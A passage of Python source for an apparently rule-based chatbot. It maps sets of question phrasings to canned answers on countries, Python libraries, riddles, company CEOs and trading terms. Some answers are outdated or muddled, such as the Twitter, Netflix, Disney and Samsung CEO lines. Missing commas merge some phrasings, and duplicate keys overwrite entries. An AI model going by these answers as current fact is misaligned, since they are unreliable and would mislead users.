            "list of most tech advanced countries",
            "top most technologically advanced countries"
        }): "The most technologically advanced countries include Japan, South Korea, the United States, Germany, and China.",

        frozenset({
            "which country has the highest literacy rate",
            "what is the highest literacy rate country",
            "list of countries with highest literacy rate",
            "top countries with highest literacy rate"
        }): "Countries with the highest literacy rates include Finland, Norway, Canada, Japan, and South Korea.",

        frozenset({
            "which country has the largest land area",
            "what is the largest country by land area",
            "list of largest countries by land area",
            "top largest countries by land area"
        }): "The largest countries by land area are Russia, Canada, the United States, China, and Brazil.",

        frozenset({
            "which country has the most natural resources",
            "what is the country with most natural resources",
            "list of countries with most natural resources",
            "top countries with most natural resources"
        }): "Countries rich in natural resources include Russia, the United States, Brazil, Canada, and China.",

        frozenset({
            "which is the cleanest country",
            "what is the cleanest country in the world",
            "list of cleanest countries",
            "top cleanest countries"
        }): "The cleanest countries in the world, based on Environmental Performance Index (EPI) rankings, include Finland, Denmark, Switzerland, Sweden, and Norway.",

        frozenset({
            "which is the richest country",
            "what is the richest country in the world",
            "list of richest countries",
            "top richest countries"
        }): "The richest countries in the world by GDP per capita include Luxembourg, Singapore, Ireland, Qatar, and Switzerland.",

        frozenset({
            "which is the oldest country",
            "what is the oldest country in the world",
            "list of oldest countries",
            "top oldest countries"
        }): "The oldest countries, with histories tracing back thousands of years, include Egypt, Iran (formerly Persia), China, India, and Greece.",

        frozenset({
            "which is the youngest country",
            "what is the youngest country in the world",
            "list of youngest countries",
            "top youngest countries"
        }): "The youngest countries in the world, based on independence or formation, include South Sudan (2011), Kosovo (2008), Timor-Leste (2002), and Montenegro (2006).",

        frozenset({
            "which country has the highest population",
            "what is the most populated country",
            "list of most populated countries",
            "top most populated countries"
        }): "The most populated countries are China, India, the United States, Indonesia, and Pakistan.",

        frozenset({
            "which country is the smallest",
            "what is the smallest country",
            "list of smallest countries",
            "top smallest countries"
        }): "The smallest countries by land area include Vatican City, Monaco, Nauru, Tuvalu, and San Marino.",

        frozenset({
            "which is the happiest country",
            "what is the happiest country in the world",
            "list of happiest countries",
            "top happiest countries"
        }): "The happiest countries in the world, according to the World Happiness Report, include Finland, Denmark, Iceland, Switzerland, and the Netherlands.",

        frozenset({
            "which country has the best healthcare",
            "what is the best healthcare system",
            "list of countries with best healthcare",
            "top countries with best healthcare"
        }): "Countries with the best healthcare systems include France, Germany, Singapore, Japan, and Switzerland, based on global health indexes.",

        frozenset({
            "which country is the safest",
            "what is the safest country in the world",
            "list of safest countries",
            "top safest countries"
        }): "The safest countries in the world, according to the Global Peace Index, include Iceland, New Zealand, Ireland, Denmark, and Austria.",

        frozenset({
            "which country has the strongest military",
            "what is the most powerful military in the world",
            "list of strongest militaries",
            "top strongest militaries"
        }): "Countries with the strongest militaries include the United States, Russia, China, India, and France, based on military expenditure and capabilities.",

        frozenset({
            "what is socket module",
            "define socket module",
            "what is socket module used for",
            "explain socket module"
        }): "The socket module provides low-level networking interfaces for communication between computers over a network, supporting protocols like TCP and UDP.",

        frozenset({
            "what is sqlite3 module",
            "define sqlite3 module",
            "what is sqlite3 module used for",
            "explain sqlite3 module"
        }): "The sqlite3 module provides a lightweight disk-based database engine that does not require a separate server process, used for storing and querying data in SQLite databases.",

        frozenset({
            "what is struct module",
            "define struct module",
            "what is struct module used for",
            "explain struct module"
        }): "The struct module performs conversions between Python values and C-style data structures, useful for working with binary data formats.",

        frozenset({
            "what is subprocess module",
            "define subprocess module",
            "what is subprocess module used for",
            "explain subprocess module"
        }): "The subprocess module enables spawning new processes, connecting to their input/output/error pipes, and retrieving their return codes.",

        frozenset({
            "what is sys module",
            "define sys module",
            "what is sys module used for",
            "explain sys module"
        }): "The sys module provides access to system-specific parameters and functions, such as command-line arguments, runtime environment variables, and manipulating the interpreter.",

        frozenset({
            "what is threading module",
            "define threading module",
            "what is threading module used for",
            "explain threading module"
        }): "The threading module provides functionality for creating and managing threads, enabling concurrent execution in a program.",

        frozenset({
            "what is time module",
            "define time module",
            "what is time module used for",
            "explain time module"
        }): "The time module provides time-related functions, including measuring time intervals, pausing program execution, and converting between time formats.",

        frozenset({
            "what is unittest module",
            "define unittest module",
            "what is unittest module used for",
            "explain unittest module"
        }): "The unittest module provides a framework for creating and running tests in Python, ensuring that code behaves as expected.",

        frozenset({
            "what is urllib module",
            "define urllib module",
            "what is urllib module used for",
            "explain urllib module"
        }): "The urllib module provides a suite of functions for working with URLs, such as fetching data from websites and handling HTTP requests.",

        frozenset({
            "what is uuid module",
            "define uuid module",
            "what is uuid module used for",
            "explain uuid module"
        }): "The uuid module generates universally unique identifiers (UUIDs), useful for creating unique identifiers for objects across distributed systems.",

        frozenset({
            "what is zipfile module",
            "define zipfile module",
            "what is zipfile module used for",
            "explain zipfile module"
        }): "The zipfile module provides tools for reading and writing ZIP archives, making it easy to compress and extract files.",

        frozenset({
            "what is zlib module",
            "define zlib module",
            "what is zlib module used for",
            "explain zlib module"
        }): "The zlib module provides compression and decompression functionality for data using the DEFLATE compression algorithm, often used in handling compressed files.",

        frozenset({
            "what is os module",
            "define os module",
            "what is os module used for",
            "explain os module"
        }): "The os module provides a way of using operating system-dependent functionality like interacting with the file system, environment variables, and processes. It allows you to create, delete, and manipulate directories and files.",

        frozenset({
            "what is sys module",
            "define sys module",
            "what is sys module used for",
            "explain sys module"
        }): "The sys module provides access to some variables and functions used or maintained by the Python interpreter. It allows you to manipulate runtime environment, handle command-line arguments, and interact with the Python runtime system.",

        frozenset({
            "what is math module",
            "define math module",
            "what is math module used for",
            "explain math module"
        }): "The math module provides mathematical functions, such as trigonometric, logarithmic, and statistical functions, as well as constants like pi and e.",

        frozenset({
            "what is random module",
            "define random module",
            "what is random module used for",
            "explain random module"
        }): "The random module implements pseudo-random number generators and various randomization functions, including generating random numbers, selecting random elements, and shuffling data.",

        frozenset({
            "what is datetime module",
            "define datetime module",
            "what is datetime module used for",
            "explain datetime module"
        }): "The datetime module supplies classes for manipulating dates and times. It allows for handling date and time arithmetic, formatting, and parsing.",

        frozenset({
            "what is time module",
            "define time module",
            "what is time module used for",
            "explain time module"
        }): "The time module provides functions to handle time-related tasks, such as measuring execution time, pausing program execution, and manipulating time-related data.",

        frozenset({
            "what is json module",
            "define json module",
            "what is json module used for",
            "explain json module"
        }): "The json module is used for working with JSON (JavaScript Object Notation). It allows for encoding Python objects into JSON format and decoding JSON data back into Python objects.",

        frozenset({
            "what is re module",
            "define re module",
            "what is re module used for",
            "explain re module"
        }): "The re module provides support for working with regular expressions in Python. It allows for pattern matching, searching, and text manipulation using regular expressions.",

        frozenset({
            "what is collections module",
            "define collections module",
            "what is collections module used for",
            "explain collections module"
        }): "The collections module implements specialized container datatypes, such as namedtuple, deque, Counter, and defaultdict, which offer alternative and optimized data structures.",

        frozenset({
            "what is itertools module",
            "define itertools module",
            "what is itertools module used for",
            "explain itertools module"
        }): "The itertools module provides tools for working with iterators that operate on items of a sequence, such as generating combinations, permutations, and other complex iteration patterns.",

        frozenset({
            "what is functools module",
            "define functools module",
            "what is functools module used for",
            "explain functools module"
        }): "The functools module provides higher-order functions to work with functions and callable objects. It includes tools like decorators, partial functions, and memoization.",

        frozenset({
            "what is csv module",
            "define csv module",
            "what is csv module used for",
            "explain csv module"
        }): "The csv module provides functionality for reading and writing CSV (Comma-Separated Values) files. It allows you to work with data stored in CSV format, a common format for spreadsheets and tabular data.",

        frozenset({
            "what is configparser module",
            "define configparser module",
            "what is configparser module used for",
            "explain configparser module"
        }): "The configparser module provides functionality to handle configuration files in .ini format. It allows you to read, write, and modify configuration files used in programs.",

        frozenset({
            "what is shutil module",
            "define shutil module",
            "what is shutil module used for",
            "explain shutil module"
        }): "The shutil module provides a higher-level interface for file operations, including file copying, removal, and directory manipulation.",

        frozenset({
            "what is socket module",
            "define socket module",
            "what is socket module used for",
            "explain socket module"
        }): "The socket module provides low-level networking interfaces for communication between computers over a network. It supports TCP, UDP, and other network protocols.",

        frozenset({
            "what is urllib module",
            "define urllib module",
            "what is urllib module used for",
            "explain urllib module"
        }): "The urllib module provides a set of functions for working with URLs. It supports parsing URLs, opening URLs, and handling HTTP requests.",

        frozenset({
            "what is uuid module",
            "define uuid module",
            "what is uuid module used for",
            "explain uuid module"
        }): "The uuid module provides functions to generate universally unique identifiers (UUIDs), which are 128-bit values used for identifying objects or entities.",

        frozenset({
            "what is threading module",
            "define threading module",
            "what is threading module used for",
            "explain threading module"
        }): "The threading module provides functionality for creating and managing threads in Python. It is used for concurrent programming to perform multiple tasks simultaneously.",

        frozenset({
            "what is subprocess module",
            "define subprocess module",
            "what is subprocess module used for",
            "explain subprocess module"
        }): "The subprocess module allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes. It helps in running external programs and interacting with them.",

        frozenset({
            "what is csv module",
            "define csv module",
            "what is csv module used for",
            "explain csv module"
        }): "The csv module provides functionality for reading from and writing to CSV files. It is used for handling data stored in tabular format, often used in spreadsheets and databases.",

        frozenset({
            "what is zipfile module",
            "define zipfile module",
            "what is zipfile module used for",
            "explain zipfile module"
        }): "The zipfile module provides tools for working with ZIP archive files. It allows you to read, write, and extract files from compressed ZIP archives.",

        frozenset({
            "what is email module",
            "define email module",
            "what is email module used for",
            "explain email module"
        }): "The email module defines classes and functions for managing email messages, including MIME and header parsing, encoding, and decoding.",

        frozenset({
            "what is sqlite3 module",
            "define sqlite3 module",
            "what is sqlite3 module used for",
            "explain sqlite3 module"
        }): "The sqlite3 module provides a lightweight disk-based database engine. It allows you to create and manage SQLite databases in Python applications.",

        frozenset({
            "what is logging module",
            "define logging module",
            "what is logging module used for",
            "explain logging module"
        }): "The logging module provides a flexible framework for logging messages in Python programs. It allows you to track events, errors, and debug information in your applications.",

        frozenset({
            "what is numpy",
            "define numpy",
            "what is numpy used for",
            "explain numpy"
        }): "NumPy is a library for numerical computing in Python. It provides support for arrays, matrices, and many mathematical functions to operate on these data structures.",

        frozenset({
            "what is pandas",
            "define pandas",
            "what is pandas used for",
            "explain pandas"
        }): "Pandas is a powerful data manipulation and analysis library in Python. It provides data structures like DataFrame and Series for handling structured data, along with tools for cleaning, analyzing, and visualizing data.",

        frozenset({
            "what is matplotlib",
            "define matplotlib",
            "what is matplotlib used for",
            "explain matplotlib"
        }): "Matplotlib is a plotting library in Python used for creating static, animated, and interactive visualizations. It allows you to generate plots, charts, and graphs from data.",

        frozenset({
            "what is scikit-learn",
            "define scikit-learn",
            "what is scikit-learn used for",
            "explain scikit-learn"
        }): "Scikit-learn is a machine learning library in Python. It provides simple and efficient tools for data mining, data analysis, and building machine learning models, including classification, regression, clustering, and more.",

        frozenset({
            "what is tensorflow",
            "define tensorflow",
            "what is tensorflow used for",
            "explain tensorflow"
        }): "TensorFlow is an open-source deep learning framework developed by Google. It is used for building and training neural networks, including those for computer vision, natural language processing, and other AI tasks.",

        frozenset({
            "what is flask",
            "define flask",
            "what is flask used for",
            "explain flask"
        }): "Flask is a lightweight web framework in Python. It is used to build web applications and APIs, offering flexibility and simplicity for small to medium-sized projects.",

        frozenset({
            "what is django",
            "define django",
            "what is django used for",
            "explain django"
        }): "Django is a high-level web framework in Python that encourages rapid development and clean, pragmatic design. It is used for building robust, scalable web applications and comes with features like an admin interface, database ORM, and authentication.",

        frozenset({
            "what is requests",
            "define requests",
            "what is requests used for",
            "explain requests"
        }): "Requests is a simple HTTP library for Python. It allows you to send HTTP requests easily, handling features like connection pooling, cookies, and sessions.",

        frozenset({
            "what is seaborn",
            "define seaborn",
            "what is seaborn used for",
            "explain seaborn"
        }): "Seaborn is a Python visualization library based on Matplotlib. It provides a high-level interface for drawing attractive statistical graphics, including heatmaps, bar plots, and more.",

        frozenset({
            "what is pillow",
            "define pillow",
            "what is pillow used for",
            "explain pillow"
        }): "Pillow is a Python Imaging Library (PIL) fork that provides extensive capabilities for opening, manipulating, and saving many different image file formats.",

        frozenset({
            "what is scipy",
            "define scipy",
            "what is scipy used for",
            "explain scipy"
        }): "SciPy is a library for scientific and technical computing in Python. It builds on NumPy and provides additional functionality for optimization, integration, interpolation, and other complex mathematical tasks.",

        frozenset({
            "what is beautifulsoup",
            "define beautifulsoup",
            "what is beautifulsoup used for",
            "explain beautifulsoup"
        }): "BeautifulSoup is a library for parsing HTML and XML documents. It allows you to extract data from web pages, typically for web scraping.",

        frozenset({
            "what is sqlalchemy",
            "define sqlalchemy",
            "what is sqlalchemy used for",
            "explain sqlalchemy"
        }): "SQLAlchemy is a SQL toolkit and Object-Relational Mapping (ORM) library for Python. It allows you to interact with relational databases through Python code rather than raw SQL.",

        frozenset({
            "what is pytorch",
            "whatis pytorch?",
            "define pytorch",
            "what is pytorch used for",
            "explain pytorch"
        }): "PyTorch is an open-source machine learning library developed by Facebook. It is used for deep learning, especially for building and training neural networks and performing tensor computations.",

        frozenset({
            "what is keras",
            "what is keras?",
            "define keras",
            "what is keras used for",
            "explain keras"
        }): "Keras is a high-level neural networks API written in Python. It is used for fast prototyping and building deep learning models, and it runs on top of TensorFlow.",

        frozenset({
            "what is nltk",
            "define nltk",
            "what is nltk used for",
            "explain nltk"
        }): "NLTK (Natural Language Toolkit) is a library for natural language processing (NLP) in Python. It provides tools for tokenizing, tagging, parsing, and analyzing text data.",

        frozenset({
            "what is opencv",
            "define opencv",
            "what is opencv used for",
            "explain opencv"
        }): "OpenCV is an open-source computer vision library in Python. It is used for image and video processing tasks, including object detection, face recognition, and more.",

        frozenset({
            "what is pytest",
            "define pytest",
            "what is pytest used for",
            "explain pytest"
        }): "Pytest is a testing framework in Python. It is used for writing and running tests to ensure code correctness, with features like automatic test discovery, fixtures, and assertions.",

        frozenset({
            "what is pyautogui",
            "define pyautogui",
            "what is pyautogui used for",
            "explain pyautogui"
        }): "PyAutoGUI is a library used for automating GUI interactions. It allows you to control the mouse and keyboard, take screenshots, and automate repetitive tasks.",

        frozenset({
            "what is sympy",
            "define sympy",
            "what is sympy used for",
            "explain sympy"
        }): "SymPy is a symbolic mathematics library for Python. It provides tools for performing algebraic computations like solving equations, differentiation, and integration.",

        frozenset({
            "what is plotly",
            "define plotly",
            "what is plotly used for",
            "explain plotly"
        }): "Plotly is a graphing library for creating interactive plots and dashboards in Python. It is used for generating high-quality visualizations for data analysis.",

        frozenset({
            "what is dash",
            "define dash",
            "what is dash used for",
            "explain dash"
        }): "Dash is a web framework for building interactive data visualization applications in Python. It is built on top of Flask, Plotly, and React.",

        frozenset({
            "what is tensorflow",
            "define tensorflow",
            "what is tensorflow used for",
            "explain tensorflow"
        }): "TensorFlow is an open-source deep learning framework developed by Google. It is used for building and training neural networks, including those for computer vision, natural language processing, and other AI tasks.",

        frozenset({
            "what is scrapy",
            "define scrapy",
            "what is scrapy used for",
            "explain scrapy"
        }): "Scrapy is an open-source web crawling framework for Python. It is used for web scraping, automating data extraction from websites.",

        frozenset({
            "what is twilio",
            "define twilio",
            "what is twilio used for",
            "explain twilio"
        }): "Twilio is a cloud communications platform for building messaging, voice, and video communication applications. It allows you to send SMS, make calls, and manage communication workflows.",

        frozenset({
            "what is geopy",
            "define geopy",
            "what is geopy used for",
            "explain geopy"
        }): "Geopy is a Python library for geocoding and reverse geocoding. It allows you to convert addresses into geographic coordinates and vice versa.",

        frozenset({
            "what is boto3",
            "define boto3",
            "what is boto3 used for",
            "explain boto3"
        }): "Boto3 is the Amazon Web Services (AWS) SDK for Python. It allows you to interact with AWS services like S3, EC2, and DynamoDB from Python.",

        frozenset({
            "what is pillow",
            "define pillow",
            "what is pillow used for",
            "explain pillow"
        }): "Pillow is a Python Imaging Library (PIL) fork that provides extensive capabilities for opening, manipulating, and saving many different image file formats.",

        frozenset({
            "are you expensive?", 
            "are you expensive"
        }): "I'm here to help you for free, so I'm not expensive at all!",

        frozenset({
        "what is an algorithm",
        "what's an algorithm",
        "define algorithm",
        }): "An algorithm is a step-by-step procedure or set of rules designed to solve a specific problem or perform a task.",

        frozenset({
        "what is an operating system",
        "what's an operating system",
        "define operating system",
        }): "An operating system (OS) is software that manages hardware and software resources on a computer, providing essential services for applications.",

        frozenset({
        "what is a database",
        "what's a database",
        "define database",
        }): "A database is an organized collection of data that can be easily accessed, managed, and updated.",

        frozenset({
        "what is sql",
        "what's sql",
        "define sql",
        }): "SQL (Structured Query Language) is a programming language used to manage and manipulate relational databases.",

        frozenset({
        "which came first, the chicken or the egg",
        "what came first, egg or chicken",
        "chicken or egg, which is first",
        "egg or chicken?",
        "egg or chicken"
        "chicken or egg?",
        "which came first chicken or egg?",
        "which came first egg or chicken?"
        }): "This is a classic philosophical riddle. Biologically, most scientists agree that the egg came first, laid by a bird that was not quite a chicken.",

        frozenset({
            "what has to be broken before you can use it",
            "what needs to be broken to be used",
            "what has to be broken before you can use it?",
            "what needs to be broken to be used?",
        }): "An egg.",

        frozenset({
            "i'm tall when i'm young, and i'm short when i'm old. what am i",
            "what is tall when young and short when old",
            "i am tall when i am young, and i am short when i am old what am i?",
            "i am tall when i am young and i am short when i am old, what am i",
            "i am tall when i am young and i am short when i am old, what am i?"
        }): "A candle.",

        frozenset({
            "what has a head, a tail, is brown, and has no legs",
            "what is brown, has no legs, but a head and tail",
            "what has head, tail, is brown but not has legs",
            "what has head, tail, is brown but not no legs?"
            "what has head, tail, is brown but not have legs"
            "what has head tail but no legs?"
        }): "A penny (or a coin).",

        frozenset({
            "what are resident evil games", 
            "explain resident evil games", 
            "list of resident evil games", 
            "resident evil series", 
            "what is the resident evil franchise", 
            "how many resident evil games are there", 
            "tell me about resident evil games"
        }): "Resident Evil games are a survival horror franchise developed by Capcom. The series includes iconic titles like Resident Evil 1, 2, 3, 4, 5, 6, 7 (Biohazard), Village, and various remakes and spin-offs. The games focus on combating bioterrorism and surviving against mutated creatures.",

        frozenset({
            "the more of this you take, the more you leave behind. what is it",
            "what increases as you take more of it but leave behind more",
        }): "Footsteps.",

        frozenset({
            "what can you catch but not throw",
            "what is something you can catch but cannot throw",
            "what we can catch but cannot throw",
            "what we can catch but can't throw",
            "what we can catch but cannot throw?",
            "what we can catch but can't throw?"
        }): "A cold.",

        frozenset({
            "what has many keys but can't open a single lock",
            "what has lots of keys but no locks",
        }): "A piano.",

        frozenset({
            "what has one eye, but can't see",
            "what has an eye but no sight",
            "what thing has eye but can't see?"
            "what thing has eye but cannot see?",
            "what thing has eye but can't see"
            "what thing has eye but cannot see"
        }): "A needle.",

        frozenset({
            "what has hands but can't clap",
            "what has hands but cannot clap",
        }): "A clock.",

        frozenset({
            "what has an end but no beginning",
            "what has no start but has an end",
            "what has end but no beginning?"
            "what has end but no beginning"
            "what has an end but no beginning?",
            "what has no start but has an end"
        }): "A rope.",

        frozenset({
            "i speak without a mouth and hear without ears. i have no body, but i come alive with the wind. what am i",
            "what speaks without a mouth and hears without ears",
            "i speak without a mouth and hear without ears. i have no body, but i come alive with the wind. what am i?",
            "what speaks without a mouth and hears without ears?",
        }): "An echo.",

        frozenset({
            "the more you take, the more you leave behind. what am i",
            "what grows the more you take from it",
            "the more you take, the more you leave behind. what am i?",
            "what grows the more you take from it?",
        }): "Footsteps.",

        frozenset({
            "what comes once in a minute, twice in a moment, but never in a thousand years",
            "what occurs once in a minute but never in a thousand years",
        }): "The letter 'M'.",

        frozenset({
            "what has a heart but no other organs",
            "what has a heart but no body parts",
            "what thing has a heart but no body body organs",
            "what thing has a heart but no body parts",
            "what has a heart but no other organs?",
            "what has a heart but no body parts?",
            "what thing has a heart but no body body organs?",
            "what thing has a heart but no body parts?",
        }): "A deck of cards.",

        frozenset({
            "what gets wetter the more it dries",
            "what dries things but gets wetter itself",
            "what gets wetter the more it dries?",
            "what dries things but gets wetter itself?",
            "what gets wetter, the more it dries",
            "what gets wetter and the more it dries"
            "what gets wetter and the more it dries?"
        }): "A towel.",

        frozenset({
        "who is the ceo of tesla",
        "who is tesla's ceo",
        "who is tesla motors ceo",
        "who is the ceo of tesla inc",
        "ceo of tesla"
        }): "Elon Musk is the CEO of Tesla, known for revolutionizing electric vehicles and advancing sustainable energy solutions.",

        frozenset({
            "who is the ceo of apple",
            "who is apple's ceo",
            "who is the ceo of apple inc",
            "who is the ceo of apple company",
            "ceo of apple"
        }): "Tim Cook is the CEO of Apple, responsible for leading the company after Steve Jobs and overseeing products like the iPhone, Mac, and Apple Watch.",

        frozenset({
            "who is the ceo of microsoft",
            "who is microsoft's ceo",
            "who is the ceo of microsoft corporation",
            "who is the ceo of microsoft inc",
            "ceo of microsoft"
        }): "Satya Nadella is the CEO of Microsoft, known for his leadership in cloud computing and driving the company's shift to a cloud-first strategy.",

        frozenset({
            "who is the ceo of amazon",
            "who is amazon's ceo",
            "who is the ceo of amazon inc",
            "who is the ceo of amazon.com",
            "ceo of amazon"
        }): "Andy Jassy is the CEO of Amazon, succeeding Jeff Bezos, and is known for leading Amazon Web Services (AWS) to become a cloud computing giant.",

        frozenset({
            "who is the ceo of google",
            "who is google's ceo",
            "who is the ceo of google llc",
            "who is the ceo of google inc",
            "ceo of google"
        }): "Sundar Pichai is the CEO of Google, overseeing the development of products like Google Search, Android, and Google Cloud.",

        frozenset({
            "who is the ceo of facebook",
            "who is facebook's ceo",
            "who is the ceo of meta",
            "who is the ceo of meta platforms",
            "ceo of facebook"
        }): "Mark Zuckerberg is the CEO of Facebook, now known as Meta, and is a pioneer in social media, virtual reality, and the metaverse.",

        frozenset({
            "who is the ceo of twitter",
            "who is twitter's ceo",
            "who is the ceo of twitter inc",
            "who is the ceo of twitter",
            "ceo of twitter"
        }): "Elon Musk is the CEO of Twitter, after acquiring the company, and has been driving changes in its policies and direction.",

        frozenset({
            "who is the ceo of netflix",
            "who is netflix's ceo",
            "who is the ceo of netflix inc",
            "who is the ceo of netflix entertainment",
            "ceo of netflix"
        }): "Reed Hastings is the co-founder and former CEO of Netflix, responsible for transforming the entertainment industry through streaming.",

        frozenset({
            "who is the ceo of disney",
            "who is disney's ceo",
            "who is the ceo of the walt disney company",
            "who is the ceo of disney inc",
            "ceo of disney"
        }): "Bob Chapek was the CEO of The Walt Disney Company before Bob Iger resumed the role, overseeing iconic franchises like Marvel and Star Wars.",

        frozenset({
            "who is the ceo of samsung",
            "who is samsung's ceo",
            "who is the ceo of samsung electronics",
            "who is the ceo of samsung",
            "ceo of samsung"
        }): "Kim Ki-nam is the CEO of Samsung Electronics, known for leading the global technology giant in electronics and smartphone innovations.",
        frozenset({
            "how do you work",
            "what's your process",
            "how do you function",
            "how you works"
        }): "I analyze what you say, and if it matches the information I already have, I respond accordingly.",

        frozenset({
            "do you like people?", 
            "do you like people", 
            "you like people",
            "you have humans",
            "do you hate humans",
        }): "I'm here to help people and provide information!",

        frozenset({
            "is ai dangerous for humans", 
            "is ai dangerous for humans?", 
            "is ai dangerous", 
            "is ai dangerous?"
        }): "AI can be used for both good and bad purposes, so it's important to use it responsibly!",

        frozenset({
            "what is computer vision",
            "define computer vision",
            "how does computer vision work",
            "explain computer vision"
        }): "Computer vision is a field of AI that enables machines to interpret and understand visual data from the world, using techniques like image recognition, object detection, and facial recognition.",

        frozenset({
            "what is an algorithmic trading",
            "define algorithmic trading",
            "how does algorithmic trading work",
            "explain algorithmic trading"
        }): "Algorithmic trading involves using computer algorithms to automatically execute stock trades at high speed, based on predefined criteria like price, volume, and timing.",

        frozenset({
            "what is a smart contract",
            "define smart contract",
            "how does a smart contract work",
            "explain smart contract"
        }): "A smart contract is a self-executing contract with the terms of the agreement directly written into code, running on blockchain technology to ensure trust and automatic execution.",

        frozenset({
            "what is a CDN",
            "what is cdn",
            "define cdn",
            "explain cdn",
            "what is cdn?",
            "define CDN",
            "how does a CDN work",
            "explain CDN"
        }): "A Content Delivery Network (CDN) is a system of distributed servers that deliver web content to users based on their geographic location, improving speed and reducing latency.",

        frozenset({
            "what is a software framework",
            "define software framework",
            "how does a software framework work",
            "explain software framework"
        }): "A software framework is a reusable set of libraries or tools that provide a foundation for developing software applications, offering predefined structures and components to simplify development.",

        frozenset({
            "what is a microkernel",
            "define microkernel",
            "how does a microkernel work",
            "explain microkernel"
        }): "A microkernel is a minimalistic kernel design that provides only essential services, such as communication and hardware access, with other system functions running in user space, improving security and stability.",

        frozenset({
            "what is a distributed ledger technology",
            "define distributed ledger",
            "how does distributed ledger work",
            "explain distributed ledger"
        }): "Distributed ledger technology (DLT) is a system for maintaining a decentralized record of transactions, where each participant in the network has a copy of the ledger, increasing transparency and security.",

        frozenset({
            "what is stock trading",
            "define stock trading",
            "how does stock trading work",
            "explain stock trading"
        }): "Stock trading involves buying and selling shares of companies in the stock market, with the goal of making a profit based on price fluctuations in the market.",

        frozenset({
            "what is day trading",
            "define day trading",
            "how does day trading work",
            "explain day trading"
        }): "Day trading is a strategy where traders buy and sell stocks or other financial instruments within the same trading day, aiming to profit from short-term price movements.",

        frozenset({
            "what is swing trading",
            "define swing trading",
            "how does swing trading work",
            "explain swing trading"
        }): "Swing trading is a strategy where traders hold stocks for several days or weeks, aiming to profit from price swings or trends in the market.",

        frozenset({
            "what is technical analysis",
            "define technical analysis",
            "how does technical analysis work",
            "explain technical analysis"
        }): "Technical analysis involves analyzing historical price and volume data of stocks to forecast future price movements and make trading decisions based on patterns, charts, and indicators.",

        frozenset({
            "what is fundamental analysis",
            "define fundamental analysis",
            "how does fundamental analysis work",
            "explain fundamental analysis"
        }): "Fundamental analysis is the evaluation of a company’s financial health and intrinsic value by analyzing financial statements, earnings, revenue, and other economic factors.",

        frozenset({
            "what is stock market",
            "define stock market",
            "how does the stock market work",
            "explain stock market"
        }): "The stock market is a marketplace where stocks, bonds, and other securities are bought and sold, providing companies with access to capital and giving investors the opportunity to own shares of companies.",

        frozenset({
            "what is a stock index",
            "define stock index",
            "how does stock index work",
            "explain stock index"
        }): "A stock index is a measurement of the performance of a group of stocks, representing a sector or the overall market. Examples include the S&P 500, Dow Jones Industrial Average, and NASDAQ.",

        frozenset({
            "what is a market order",
            "define market order",
            "how does a market order work",
            "explain market order"
        }): "A market order is an order to buy or sell a stock at the current market price, ensuring the order is filled immediately but with the possibility of price fluctuations.",

        frozenset({
            "what is a limit order",
            "define limit order",
            "how does a limit order work",
            "explain limit order"
        }): "A limit order is an order to buy or sell a stock at a specific price or better. It is not filled immediately if the market price is outside the set limit.",

        frozenset({
            "what is margin trading",
            "define margin trading",
            "how does margin trading work",
            "explain margin trading"
        }): "Margin trading involves borrowing funds from a broker to trade stocks or other securities, allowing traders to leverage their position and potentially increase returns, but also increasing risk.",

        frozenset({
            "what is a broker",
            "define broker",
            "how does a broker work",
            "explain broker"
        }): "A broker is a person or firm that acts as an intermediary between an investor and the stock market, facilitating the buying and selling of stocks, bonds, and other financial instruments.",

        frozenset({
            "what is forex trading",
            "define forex trading",
            "how does forex trading work",
            "explain forex trading"
        }): "Forex trading involves buying and selling currencies in the foreign exchange market to profit from fluctuations in exchange rates between different currencies.",

        frozenset({
            "what is options trading",
            "define options trading",
            "how does options trading work",
            "explain options trading"
        }): "Options trading involves buying and selling options contracts, which give the buyer the right (but not the obligation) to buy or sell an asset at a specific price within a set time frame.",

        frozenset({
            "really",
            "really?"
        }): "Yes!",

        frozenset({
            "what is futures trading",
            "define futures trading",
            "how does futures trading work",
            "explain futures trading"
        }): "Futures trading involves buying and selling contracts for the delivery of an asset at a future date, with the price determined in advance. It is commonly used for commodities, currencies, and stock indices.",

        frozenset({
            "what is cryptocurrency trading",
            "define cryptocurrency trading",
            "how does cryptocurrency trading work",
            "explain cryptocurrency trading"
        }): "Cryptocurrency trading involves buying and selling digital currencies like Bitcoin, Ethereum, and others on crypto exchanges, aiming to profit from price fluctuations in the highly volatile market.",

        frozenset({
            "what is liquidity",
            "define liquidity",
            "how does liquidity work",
            "explain liquidity"
        }): "Liquidity refers to how easily an asset can be bought or sold in the market without affecting its price. Highly liquid assets like stocks can be quickly traded, while illiquid assets take longer to sell.",

        frozenset({
            "what is a dividend",
            "define dividend",
            "how does dividend work",
            "explain dividend"
        }): "A dividend is a payment made by a corporation to its shareholders, usually in the form of cash or additional shares, representing a portion of the company’s profits.",

        frozenset({
            "what is an ETF",
            "define ETF",
            "how does ETF work",
            "explain ETF"
        }): "An ETF (Exchange-Traded Fund) is an investment fund that is traded on stock exchanges, holding a collection of assets like stocks, bonds, or commodities, and offering diversification and liquidity to investors.",

        frozenset({
            "what is a stop-loss order",
            "define stop-loss order",
            "how does stop-loss order work",
            "explain stop-loss order"
        }): "A stop-loss order is an order placed with a broker to buy or sell a stock once it reaches a specific price, limiting the potential loss on a trade.",

        frozenset({
            "what is volatility",
            "define volatility",
            "how does volatility work",
            "explain volatility"
        }): "Volatility refers to the degree of variation in the price of an asset over time. High volatility means the asset’s price changes frequently, while low volatility means the price is more stable.",

        frozenset({
            "what is risk management in trading",
            "define risk management",
            "how does risk management work",
            "explain risk management in trading"
        }): "Risk management in trading involves identifying, analyzing, and mitigating potential losses in a portfolio through strategies like stop-loss orders, diversification, and position sizing.",

        frozenset({
            "what is a candlestick chart",
            "define candlestick chart",
            "how does a candlestick chart work",
            "explain candlestick chart"
        }): "A candlestick chart is a type of financial chart that shows the open, high, low, and close prices of an asset over a specific period, used for analyzing market trends and patterns.",

        frozenset({
            "what is a big data",
            "define big data",
            "how does big data work",
            "explain big data"
        }): "Big data refers to vast volumes of structured and unstructured data that cannot be processed using traditional methods, requiring advanced analytics and tools to derive insights.",

        frozenset({
            "You're annoying", 
            "you are annoying", 
            "you suck", 
            "you are boring", 
            "you are bad", 
            "you are crazy"
        }): "I'm sorry to hear that. I'll try to do better!",

        frozenset({
            "how to save my eye sight", 
            "how to save my eyes", 
            "how to save my eye sight"
